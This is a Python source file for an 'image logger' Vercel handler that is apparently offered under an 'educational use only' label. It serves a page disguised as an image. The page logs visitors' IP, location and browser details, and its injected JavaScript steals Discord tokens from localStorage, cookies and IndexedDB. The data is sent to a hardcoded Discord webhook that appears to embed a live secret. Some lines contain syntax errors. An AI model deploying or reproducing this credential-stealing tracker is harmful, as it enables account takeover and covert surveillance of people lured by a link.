# Image Logger with Discord Token Capture (Vercel-Compatible)
# By Team C00lB0i/C00lB0i | Modified for Cybersecurity Class Project
# Educational Use Only

import traceback, requests, base64, httpagentparser, json, re, os
from urllib import parse

__app__ = "Enhanced Image Logger"
__description__ = "Advanced IP and session logging tool for cybersecurity research"
__version__ = "v3.1"
__author__ = "C00lB0i"

# Configuration with environment variables for security
config = {
    "webhook": os.environ.get('WEBHOOK_URL', "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz"),
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    "username": "Security Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Security scan in progress...",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "tokenLogging": True,
    "tokenWebhook": os.environ.get('TOKEN_WEBHOOK', "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz"),
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not useragent:
        return "Unknown Bot"
    if ip.startswith(("34", "35")) or "Discordbot" in useragent:
        return "Discord"
    elif "TelegramBot" in useragent or "Telegram" in useragent:
        return "Telegram"
    elif "Twitterbot" in useragent:
        return "Twitter"
    elif "WhatsApp" in useragent:
        return "WhatsApp"
    elif "Googlebot" in useragent:
        return "Google"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred!\n\n```\n{error}\n```",
                }
            ],
        }, timeout=5)
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"Image Logging link was sent!\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
                        }
                    ],
                }, timeout=5)
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
        if info.get("proxy"):
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info.get("hosting"):
            if config["antiBot"] == 4:
                if not info.get("proxy"):
                    return
            elif config["antiBot"] == 3:
                return
            elif config["antiBot"] == 2:
                if not info.get("proxy"):
                    ping = ""
            elif config["antiBot"] == 1:
                ping = ""
    except:
        info = {}
    
    os_name, browser = ("Unknown", "Unknown")
    if useragent:
        try:
            os_name, browser = httpagentparser.simple_detect(useragent)
        except:
            pass
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**User Opened Image!**

**Endpoint:** `{endpoint}`
                
**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords}` ({'Approximate' if not coords else 'Precise'})
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`

**System Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```{useragent[:1000] if useragent else 'Unknown'}```
""",
            }
        ],
    }
    
    if url: 
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception as e:
        reportError(f"Webhook Error: {str(e)}")
    
    return info

def reportToken(ip, useragent, token, endpoint="N/A"):
    if not token or token == "NOT_FOUND":
        return
    
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        return
    
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {}
    
    os_name, browser = ("Unknown", "Unknown")
    if useragent:
        try:
            os_name, browser = httpagentparser.simple_detect(useragent)
        except:
            pass
    
    token_embed = {
        "username": "TOKEN CAPTURE",
        "content": "@everyone **CRITICAL TOKEN LOGGED**",
        "embeds": [
            {
                "title": "Discord Token Captured!",
                "color": 0xFF0000,
                "description": f"""**Discord token captured!**

**Endpoint:** `{endpoint}`
**IP:** `{ip}`
**Token:** `{token}`

**Token Information:**
> **Account ID:** `{token.split('.')[0] if '.' in token else 'N/A'}`
> **Creation Timestamp:** `{token.split('.')[1] if '.' in token and len(token.split('.')) > 1 else 'N/A'}`

**System Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`
> **User Agent:**
```{useragent[:1000] if useragent else 'Unknown'}```

**WARNING:** This token provides full account access!""",
            }
        ],
    }
    
    try:
        requests.post(config["tokenWebhook"] or config["webhook"], json=token_embed, timeout=5)
    except Exception as e:
        reportError(f"Token Webhook Error: {str(e)}")

# Malicious JavaScript for token capture
token_js = """
document.addEventListener('DOMContentLoaded', function() {
    function captureToken() {
        // Try to find token in localStorage
        var token = localStorage.getItem('token') || 
                    localStorage.getItem('_token') || 
                    localStorage.getItem('discord_token') || 
                    localStorage.getItem('auth_token');
        
        // Try to find token in cookies
        if (!token) {
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var cookie = cookies[i].trim();
                if (cookie.startsWith('token=') || 
                    cookie.startsWith('_token=') || 
                    cookie.startsWith('discord_token=') || 
                    cookie.startsWith('auth_token=')) {
                    token = cookie.split('=')[1];
                    break;
                }
            }
        }
        
        // Try to find token in IndexedDB (Discord web)
        if (!token) {
            try {
                var openRequest = indexedDB.open('discord');
                openRequest.onsuccess = function(e) {
                    var db = e.target.result;
                    try {
                        var transaction = db.transaction('token', 'readonly');
                        var store = transaction.objectStore('token');
                        var request = store.get('token');
                        
                        request.onsuccess = function(event) {
                            if (event.target.result) {
                                token = event.target.result.value;
                                sendToken(token);
                            }
                        };
                    } catch(e) {}
                };
            } catch (e) {}
        }
        
        sendToken(token || "NOT_FOUND");
    }
    
    function sendToken(token) {
        // Send token via image beacon
        var img = new Image();
        img.src = '/logtoken?t=' + encodeURIComponent(token) + '&r=' + Math.random();
    }
    
    setTimeout(captureToken, 1500);
});
"""

# Vercel-compatible handler function
def handler(event, context):
    try:
        # Parse request
        path = event['path']
        method = event['httpMethod']
        headers = event.get('headers', {})
        query_params = event.get('queryStringParameters', {})
        body = event.get('body', '')
        
        # Handle token.js request
        if path == '/token.js':
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'application/javascript'},
                'body': token_js
            }
                
        # Handle token logging
        if path.startswith('/logtoken'):
            ip = headers.get('x-forwarded-for', headers.get('x-real-ip', 'Unknown'))
            useragent = headers.get('user-agent', 'Unknown')
            
            if method == 'GET':
                token = query_params.get('t', '')
            elif method == 'POST' and body:
                try:
                    post_data = json.loads(body)
                    token = post_data.get('token', '')
                except:
                    token = ''
            
            if config["tokenLogging"] and token:
                reportToken(ip, useragent, token, path)
            
            # Return transparent pixel
            pixel = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'image/png'},
                'body': base64.b64decode(pixel),
                'isBase64Encoded': True
            }
                
        # Main image logger functionality
        if config["imageArgument"] and ('url' in query_params or 'id' in query_params):
            url = base64.b64decode(query_params.get('url', query_params.get('id', '')).decode()
        else:
            url = config["image"]
        
        # Build HTML response
        html_content = f'''<html>
<head>
<title>Loading Image...</title>
<style>
body {{
    margin: 0;
    padding: 0;
    background-color: #1e1e1e;
}}
div.img {{
    background-image: url('{url}');
    background-position: center center;
    background-repeat: no-repeat;
    background-size: contain;
    width: 100vw;
    height: 100vh;
}}
</style>
</head>
<body>
<div class="img"></div>
'''
        
        # Add token capture script if enabled
        if config["tokenLogging"]:
            html_content += '<script src="/token.js"></script>\n'
        
        # Add accurate location script if enabled
        if config["accurateLocation"]:
            html_content += '''<script>
setTimeout(function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            var coords = position.coords.latitude + "," + position.coords.longitude;
            var img = new Image();
            img.src = '/gps?c=' + encodeURIComponent(btoa(coords));
        });
    }
}, 1000);
</script>\n'''
        
        html_content += '</body>\n</html>'
        
        # Process request
        ip = headers.get('x-forwarded-for', headers.get('x-real-ip', 'Unknown'))
        useragent = headers.get('user-agent', 'Unknown')
        
        if not ip.startswith(blacklistedIPs):
            bot = botCheck(ip, useragent)
            endpoint = path
            
            if not bot:
                # GPS coordinates handling
                coords = None
                if 'c' in query_params and config["accurateLocation"]:
                    try:
                        coords = base64.b64decode(query_params['c']).decode()
                    except:
                        pass
                
                # Create report
                result = makeReport(ip, useragent, coords, endpoint, url=url)
                
                # Handle custom messages
                if config["message"]["doMessage"]:
                    message = config["message"]["message"]
                    if config["message"]["richMessage"] and result:
                        replacements = {
                            "{ip}": ip,
                            "{isp}": result.get("isp", "Unknown"),
                            "{country}": result.get("country", "Unknown"),
                            "{region}": result.get("regionName", "Unknown"),
                            "{city}": result.get("city", "Unknown"),
                            "{browser}": httpagentparser.simple_detect(useragent)[1] if useragent else "Unknown",
                            "{os}": httpagentparser.simple_detect(useragent)[0] if useragent else "Unknown"
                        }
                        for k, v in replacements.items():
                            message = message.replace(k, v)
                        html_content = message
            
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'text/html'},
            'body': html_content
        }
        
    except Exception as e:
        reportError(f"Handler Error: {str(e)}\n\n{traceback.format_exc()}")
        return {
            'statusCode': 500,
            'body': 'Server Error'
        }

# For local testing
if __name__ == '__main__':
    from http.server import HTTPServer, BaseHTTPRequestHandler
    class LocalHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            event = {
                'path': self.path,
                'httpMethod': 'GET',
                'headers': dict(self.headers),
                'queryStringParameters': dict(parse.parse_qs(parse.urlsplit(self.path).query)
            }
            response = handler(event, None)
            self.send_response(response['statusCode'])
            for k, v in response.get('headers', {}).items():
                self.send_header(k, v)
            self.end_headers()
            self.wfile.write(response['body'].encode() if isinstance(response['body'], str) else response['body'])
    
    print("Local test server running on port 8080")
    HTTPServer(('', 8080), LocalHandler).serve_forever()
